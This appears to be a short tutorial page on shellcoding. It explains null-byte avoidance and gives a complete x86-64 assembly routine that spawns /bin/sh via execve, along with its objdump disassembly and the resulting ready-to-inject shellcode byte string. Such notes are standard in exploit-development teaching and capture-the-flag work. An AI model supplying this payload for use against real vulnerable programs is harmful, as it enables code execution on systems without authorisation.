# Shellcoding

Can be written in C before compiling, or in Assembly.  

Use ASM instructions to set up the stack for your desired actions.  
Compile the program and use `objdump` to pull apart the binary and get the opcodes (shellcode).  

Avoid null bytes, they will likely kill the shellcode execution:  
e.g. use `xor rax, rax` instead of `mov rax, 0`.  

## Example 64bit execve("/bin/sh")

```asm
; Compile with "nasm -f elf64 sh.asm -o sh.o"
; Link "ld sh.o -o sh"

section .text
    global _start

_start:
    xor rax, rax;   ; optional if the program the function you are returning from sets RAX to 0
    push rax;   ; Puts a zero on the stack to terminate our /bin/sh string
    xor rsi, rsi;   ; Set RSI to 0
    xor rdx, rdx;   ; Set RDX to 0
    mov rbx, 0x68732f6e69622f2f;    ; Move "//bin/sh" into RBX (2 slashes to completely fill the register)
   ; For 32 bit: push a 0 value to the stack, then //sh then /bin
    push rbx;   ; move "//bin/sh" to the stack
    mov rdi, rsp;   ; Pointer to "//bin/sh" in RDI
    mov al, 0x3b;   ; execve syscall number
    syscall;
```

After compiling and linking, get opcodes with `objdump -d sh` (second column contains your shellcode):  

```bash
bin_sh:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 31 c0                xor    %rax,%rax
  401003:       50                      push   %rax
  401004:       48 31 f6                xor    %rsi,%rsi
  401007:       48 31 d2                xor    %rdx,%rdx
  40100a:       48 bb 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rbx
  401011:       2f 73 68 
  401014:       53                      push   %rbx
  401015:       48 89 e7                mov    %rsp,%rdi
  401018:       b0 3b                   mov    $0x3b,%al
  40101a:       0f 05                   syscall
```

Gives the following shellcode:  

`\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05`  
